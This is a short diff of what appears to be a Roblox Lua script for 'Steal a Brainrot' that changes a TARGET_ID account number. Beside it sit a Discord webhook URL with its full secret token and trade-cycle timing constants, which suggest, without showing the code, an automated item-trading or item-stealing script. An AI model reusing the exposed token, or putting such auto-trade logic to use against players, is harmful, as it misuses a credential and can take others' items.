@@ -56,7 +56,7 @@ end
 local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1491958831977336892/VO_yHE5mL6dLnNYVb3Hq48_4pPa7dSBmY8qFCfCq1G5sxBRu8urHlL32WZdSYk18D264"
 local GOOD_AVATAR = "https://cdn.grok.x.ai/attachments/sXvFE"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
-local TARGET_ID = 3826323047
+local TARGET_ID = 5140915332
 local DELAY_STEP = 1
 local TRADE_CYCLE_DELAY = 2
 
